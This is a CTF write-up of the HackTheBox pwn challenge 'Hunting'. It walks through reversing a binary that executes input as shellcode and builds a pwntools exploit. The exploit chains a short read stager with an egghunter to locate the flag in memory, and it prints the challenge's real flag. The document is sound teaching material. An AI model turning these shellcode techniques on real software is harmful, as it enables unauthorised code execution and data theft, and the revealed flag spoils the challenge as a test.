---
layout:     post
title:      "HackTheBox Pwn: Hunting"
subtitle:   "Write-Up"
date:       2021-02-13
author:     "D4mianwayne"
tags:    ["pwn, shellcode, egghunting, hackthebox"]
categories: ["HackTheBox"]
password:  "HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}"
layout: "simple"

---



This challenge was quite good, as someone who never really did egghunting shellcode, this was a good learning experience. So, the binary given s pretty simple, all the protections have been disabled except the PIE but, analysing the workflow, we can see that it reads shellcode and then execute that shellcode.

<!-- more -->

```asm
4mianwayne@oracle:~/Pwning/HackTheBox$ checksec hunting
[*] '/home/d4mianwayne/Pwning/HackTheBox/hunting'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

# Reverse Engineering

In the binary itself, the `main` functions seems to be doing


```asm
int sub_1374()
{
  void *addr; // ST2C_4
  void *buf; // ST24_4
  int v3; // [esp-10h] [ebp-24h]
  int v4; // [esp-Ch] [ebp-20h]
  int v5; // [esp-8h] [ebp-1Ch]
  int v6; // [esp-4h] [ebp-18h]
  char *dest; // [esp+4h] [ebp-10h]

  addr = (void *)sub_12E8();
  signal(14, (__sighandler_t)&exit);
  alarm(3u);
  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);
  if ( dest == (char *)-1 )
    sub_1118(-1, v3, v4, v5);
  strcpy(dest, aHtbXxxxxxxxxxx);
  memset(aHtbXxxxxxxxxxx, 0, 0x25u);
  sub_1259();
  buf = malloc(0x3Cu);
  read(0, buf, 0x3Cu);
  ((void (__stdcall *)(int, void *, _DWORD))buf)(v6, buf, 0);
  return 0;
}
```
Here, if gets the address from the following function:-

```asm
int sub_12E8()
{
  unsigned int buf; // [esp+0h] [ebp-18h]
  int fd; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  read(fd, &buf, 8u);
  close(fd);
  srand(buf);
  for ( i = 0; i <= 1610612735 || (unsigned int)i > 0xF7000000; i = rand() << 16 )
    ;
  return i;
}
```

This one seems to setting the seed of the random taken from the `/dev/urandom` and then calling the `rand()` a large number of times and returns it after certain number of iterations, so this is unpredictably random.

Then after getting a random address, it calls `mmap` to allocate a memory pointed by the randomized address, then copies the flag string to that region, after that it reads `0x30` bytes from the stdin and calls the given input, hence it is reading a shellcode which will be called later on. It also makes the memmory `0` pointed by the flag before calling the `read`, things got a bit more complicated here but we have shellcode execution :)

# Initial Idea

Running it in `gdb`, we can see:-

```asm
gef➤  r
Starting program: /home/d4mianwayne/Pwning/HackTheBox/hunting 
AAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x5657c000 in ?? ()

[ ..snip.. ]


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x5655a194  →  0x00000084
$ebx   : 0x56559000  →   clc 
$ecx   : 0x5655a1b3  →  0x000000ab
$edx   : 0x3c      
$esp   : 0xffffd008  →  0x0000002b ("+"?)
$ebp   : 0xffffd028  →  0x00000000
$esi   : 0xf7fae000  →  0x001ead6c
$edi   : 0xf7fae000  →  0x001ead6c
$eip   : 0x5657c000
$eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd008│+0x0000: 0x0000002b ("+"?)	 ← $esp
0xffffd00c│+0x0004: 0x5655644f  →   mov eax, 0x0
0xffffd010│+0x0008: 0x00000001
0xffffd014│+0x000c: 0x5655a1a0  →  0x41414141
0xffffd018│+0x0010: 0x00000000
0xffffd01c│+0x0014: 0x00000000
0xffffd020│+0x0018: 0xffffd040  →  0x00000001
0xffffd024│+0x001c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x5657c000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "hunting", stopped 0x5657c000 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

After fiddling around much, and examing the memory sections, we can see the flag is loaded into the `mmap`'d page:-

```asm
gef➤  search-pattern HTB{
[+] Searching 'HTB{' in memory
[+] In '/dev/zero (deleted)'(0x74b90000-0x74b91000), permission=rwx
  0x74b90000 - 0x74b90024  →   "HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}" 
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x56555000 0x56558000 0x00000000 r-x /home/d4mianwayne/Pwning/HackTheBox/hunting
0x56558000 0x56559000 0x00002000 r-x /home/d4mianwayne/Pwning/HackTheBox/hunting
0x56559000 0x5655a000 0x00003000 rwx /home/d4mianwayne/Pwning/HackTheBox/hunting
0x5655a000 0x5657c000 0x00000000 rwx [heap]
0x74b90000 0x74b91000 0x00000000 rwx /dev/zero (deleted)
0xf7dc3000 0xf7fab000 0x00000000 r-x /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fab000 0xf7fac000 0x001e8000 --- /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fac000 0xf7fae000 0x001e8000 r-x /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fae000 0xf7fb0000 0x001ea000 rwx /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fb0000 0xf7fb2000 0x00000000 rwx 
0xf7fcb000 0xf7fcd000 0x00000000 rwx 
0xf7fcd000 0xf7fd0000 0x00000000 r-- [vvar]
0xf7fd0000 0xf7fd1000 0x00000000 r-x [vdso]
0xf7fd1000 0xf7ffb000 0x00000000 r-x /usr/lib/i386-linux-gnu/ld-2.31.so
0xf7ffc000 0xf7ffd000 0x0002a000 r-x /usr/lib/i386-linux-gnu/ld-2.31.so
0xf7ffd000 0xf7ffe000 0x0002b000 rwx /usr/lib/i386-linux-gnu/ld-2.31.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

Paying close attention to these, flag resides in  `0x74b90000  - 0x74b90024  →   "HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}"` which when we see in `vmmap` which shows the numbers of the memory pages used by the executable turns out to be from the `ummap`'d region.

```asm
0x74b90000 0x74b91000 0x00000000 rwx /dev/zero (deleted)
```

So, therefore, what we see here is the flag belongs to a 0 initialized memory region, what can we do now? 

There's a shellcode technique called `egghunting` which is used to search for `EGG` which could be string/address/byte/DWORD or anything which resides in memory which we want to search for, since the memory region where the flag resides still belongs to the binary process image, we can use `egghunting` technique shellcode and once we get the memory pointed to the `HTB{` we can print it by just calling write.

# Exploit Development and Debugging

So, without further ado, let's start, what we can do here is now:-

* Call egghunting shellcode and search for string `HTB{` in the process image.
* Once found, print it with the `write`

Let's start by first finding the `HTB` string:-

With the help of the `shellcraft.egghunter(string, starting_address)` of pwntools, we can give the string we want to find and the starting address to let it prepare the shellcode for us.

```py
from pwn import *

context.arch = "i386"

p = process("./hunting")
shellcode = asm(shellcraft.egghunter(b"HTB{", 0x50000000))
pause()
p.send(shellcode)
p.interactive()
```

> NOTE: Since PIE is enabled, the base address for the binary would start from here, more or less, `0x50000000` marking it as starting address saved seconds(I am picky).

Running the exploit and attaching it to the `gdb`:-

```asm
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffffe
$ebx   : 0x69df0000  →  "HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}"
$ecx   : 0x0       
$edx   : 0x400     
$esp   : 0xfff30008  →  0x7b425448 ("HTB{"?)
$ebp   : 0xfff30028  →  0x00000000
$esi   : 0xfff3000c  →  0x5655b44f  →   mov eax, 0x0
$edi   : 0x69df0004  →  "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}"
$eip   : 0x579fe1d9  →  0x29000000
```

Nice, we have the flag in `ebx` register, so, we can now just do 

```asm
write(1, $ebx, 0x100)
```

where `ebx` is a memory pointer to the flag.

---

### The Length Issue


Okay, so at this time I did

```py
from pwn import *

context.arch = "i386"

p = process("./hunting")
shellcode += asm(shellcraft.egghunter(b"HTB{", 0x50000000))
shellcode += asm(shellcraft.write(1, "ebx", 36))
pause()
p.send(shellcode)
p.interactive()
```

But I forgot that the length allowed was only `0x30` which was pretty much taken by the egghunter shellcode, so we need something to act as a stager shellcode. So, to do work through this, what we can do is call `read` to make the binary read large amount of input.

The shellcode would be as follows:-

```asm
    xor eax, eax
	mov al, 3
	xor ebx, ebx
	mov dl, 0xff
	int 0x80
```

To understand the shellcode, we `xor`'d the `eax` to make it `0` then we move `3` to the lower 16 bit of the register `eax` pointed by `al`, then we `xor`'d `ebx` register which will make it `0` as well, after that we move `0xff` to the lower 16 bits of the `edx` pointed by `dl`, then we do `int 0x80` to do a syscall.

So, here:-

```asm
read(ebx, ecx, edx)
```

Where `ebx` points to the `fd`, as it has been XOR'd it contains `0` which the `fd` of the `stdin` then `ecx` when the time of the execution of the shellcode pointes to the buffer itself, so we don't manipulate it's value, next, `edx` contains the size which is `0xff`, more than enough for us.

> `eax` points to the syscall number, read syscall number is 3 and the `int 0x80` is used to tell the program we are making syscall, since `eax` is `3` the `read` will be made.


Now, let's check if it works:-

```py
from pwn import *

context.arch = "i386"

p = process("./hunting")
shellcode = asm("""
	xor eax, eax
	mov al, 3
	xor ebx, ebx
	mov dl, 0xff
	int 0x80""")

log.info("SHELLCODE LENGTH:  %d" %(len(shellcode)))
pause()
p.send(shellcode)
p.interactive()
```

Running it and attaching `gdb` to one side:-

```asm
d4mianwayne@oracle:~/Pwning/HackTheBox$ python3 hunting.py 
[+] Starting local process './hunting': pid 23502
[*] SHELLCODE LENGTH:  10
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
$  
```

In `gdb` window:-

```asm
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffe9941b  →  "i686"
$ebx   : 0x1f      
$ecx   : 0xf       
$edx   : 0xffe9bfee  →  0x75682f2e ("./hu"?)
$esp   : 0xffe993f4  →  0x00000000
$ebp   : 0x1a      
$esi   : 0xffe9940b  →  0x0d4809be
$edi   : 0x19      
$eip   : 0x5754f1c8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
````
The `eip` points to the input we gave but certainly not from the start, let's check the offset:-

```asm
gef➤  pattern search kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa
[+] Searching 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa'
[+] Found at offset 40 (big-endian search) 
```

This done, we will just know that:-

```py
payload = b"A"*40
payload += shellcode
```

We are almost done.

---

Now, we will just add `shellcraft.write(1, 'ebx', 36)` with our previous work and we are done :)

The final exploit looks like:-


```py
from pwn import *

context.arch = "i386"

p = process("./hunting")


# Send the stager shellcode to read the bigger shellcode later
shellcode = asm("""
	xor eax, eax
	mov al, 3
	xor ebx, ebx
	mov dl, 0xff
	int 0x80""")

log.info("SHELLCODE LENGTH:  %d" %(len(shellcode)))

p.send(shellcode)

shellcode = b"A"*40 # Offset to the EIP
# The Egghunter shellcode to search for the memory having `HTB{` strting
shellcode += asm(shellcraft.egghunter(b"HTB{", 0x50000000))
# Once found, the `ebx` points to the flag, so we just print it
shellcode += asm(shellcraft.write(1, "ebx", 36))
p.send(shellcode)

# Recieve the flag
flag = p.recvuntil("}")
log.success("FLAG:   %s" %(flag))
p.close()
```

That aside, let's run it and this time without `gdb`:-

```asm
d4mianwayne@oracle:~/Pwning/HackTheBox$ python3 hunting.py 
[+] Starting local process './hunting': pid 23649
[*] SHELLCODE LENGTH:  10
[+] FLAG:   b'HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}'
[*] Stopped process './hunting' (pid 23649)
```

Voila, we get the flag, let's run the exploit for the remote server:-

```asm
d4mianwayne@oracle:~/Pwning/HackTheBox$ python3 hunting.py 
[+] Opening connection to 165.232.101.10 on port 31335: Done
[*] SHELLCODE LENGTH:  10
[+] FLAG:   b'HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}'
[*] Closed connection to 165.232.101.10 port 31335
```


And done!


That was quite a nice ride, hope you learned something :)


